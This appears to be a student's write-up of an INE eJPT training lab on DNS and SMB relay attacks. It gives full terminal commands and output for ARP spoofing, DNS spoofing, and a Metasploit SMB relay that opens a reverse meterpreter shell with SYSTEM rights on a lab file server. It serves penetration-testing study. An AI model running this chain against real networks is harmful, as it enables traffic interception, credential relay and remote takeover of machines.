```jsx
Lab Name: DNS & SMB Relay Attack
Platform: INE
Lab No: 22
Exam: eJPT (Jr. Penetartion Tester)
```

You are hired by a small company to perform a security assessment. Your customer is `sportsfoo.com` and they want your help to test the security of their environment, according to the scope below:

## The assumptions of this security engagement are:

You are going to do an internal penetration test, where you will be connected directly into their LAN network `172.16.5.0/24`. The scope in this test is only the `172.16.5.0/24` segment. You are in a production network, so you should not lock any user account by guessing their usernames and passwords.

## LAB ENVIRONMENT:

![image](https://github.com/user-attachments/assets/8ab7f478-4914-4c4c-bf9d-15478f92430c)

## NOTE ⚠️
> FOUR TERMINSALS WERE BEING USED AT THE SAME TIME SO COMMANDS ARE DISTRIBUTED ACCORDINGLY:

## TERMINAL 01:

```console
┌──(rootkali)-[~]
└─# msfconsole -q
msf6 > use exploit/windows/smb/smb_relay
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/smb_relay) > set SRVHOST 172.16.5.101
SRVHOST => 172.16.5.101
msf6 exploit(windows/smb/smb_relay) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/smb_relay) > set LHOST 172.16.5.101
LHOST => 172.16.5.101
msf6 exploit(windows/smb/smb_relay) > set SMBHOST 172.16.5.10
SMBHOST => 172.16.5.10
msf6 exploit(windows/smb/smb_relay) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.16.5.101:4444 
[*] Started service listener on 172.16.5.101:445 
[*] Server started.
msf6 exploit(windows/smb/smb_relay) > jobs

Jobs
====

  Id  Name                            Payload                          Payload opts
  --  ----                            -------                          ------------
  0   Exploit: windows/smb/smb_relay  windows/meterpreter/reverse_tcp  tcp://172.16.5.101:4444
```

## TERMINAL 2:

```console
┌──(rootkali)-[~]
└─# echo "172.16.5.101 *.sportsfoo.com" > dns
                                                                                                                                                       
┌──(rootkali)-[~]
└─# dnsspoof -i eth1 -f dns
dnsspoof: listening on eth1 [udp dst port 53 and not src 172.16.5.101]

```

## TERMINAL 3:

```console
┌──(rootkali)-[~]
└─# echo 1 > /proc/sys/net/ipv4/ip_forward
                                                                                                                                                       
┌──(rootkali)-[~]
└─# arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
```

## TERMINAL 4:

```console
┌──(rootkali)-[~]
└─# arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
```

## TERMINAL 2:

```console
┌──(rootkali)-[~]
└─# echo "172.16.5.101 *.sportsfoo.com" > dns
                                                                                                                                                       
┌──(rootkali)-[~]
└─# dnsspoof -i eth1 -f dns
dnsspoof: listening on eth1 [udp dst port 53 and not src 172.16.5.101]
172.16.5.5.50258 > 8.8.4.4.53:  61121+ A? fileserver.sportsfoo.com
172.16.5.5.53869 > 8.8.4.4.53:  49702+ A? fileserver.sportsfoo.com
172.16.5.5.64091 > 8.8.4.4.53:  53539+ A? fileserver.sportsfoo.com
```

## TERMINAL 1:

```console
msf6 exploit(windows/smb/smb_relay) > jobs

Jobs
====

  Id  Name                            Payload                          Payload opts
  --  ----                            -------                          ------------
  0   Exploit: windows/smb/smb_relay  windows/meterpreter/reverse_tcp  tcp://172.16.5.101:4444
[*] Sending NTLMSSP NEGOTIATE to 172.16.5.10
[*] Extracting NTLMSSP CHALLENGE from 172.16.5.10
[*] Extracting the NTLMSSP AUTH resolution from 172.16.5.5:49159, and sending Logon Failure response
[*] Forwarding the NTLMSSP AUTH resolution to 172.16.5.10
[+] SMB auth relay against 172.16.5.10 succeeded
[*] Connecting to the defined share...
[*] Regenerating the payload...
[*] Uploading payload...
[*] Created \DDIUGbzW.exe...
[*] Connecting to the Service Control Manager...
[*] Obtaining a service manager handle...
[*] Creating a new service...
[*] Closing service handle...
[*] Opening service...
[*] Starting the service...
[*] Removing the service...
[*] Closing service handle...
[*] Deleting \DDIUGbzW.exe...
[*] Sending stage (175174 bytes) to 172.16.5.10
[*] Meterpreter session 1 opened (172.16.5.101:4444 -> 172.16.5.10:49158) at 2022-01-21 19:09:13 -0500
Interrupt: use the 'exit' command to quit
msf6 exploit(windows/smb/smb_relay) > sessions

Active sessions
===============

  Id  Name  Type                     Information                       Connection
  --  ----  ----                     -----------                       ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ FILESERVER  172.16.5.101:4444 -> 172.16.5.10:49158 (172.16.5.10)

msf6 exploit(windows/smb/smb_relay) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : FILESERVER
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## DIFFERENT POSSITIONS OF THE TERMINALS HAVE BEEN DEMOSTRATED. 
## THE TERMINAL TANSESIONS ARE IN THE SEQUENCE THEY ARE DEMOSTAETED.
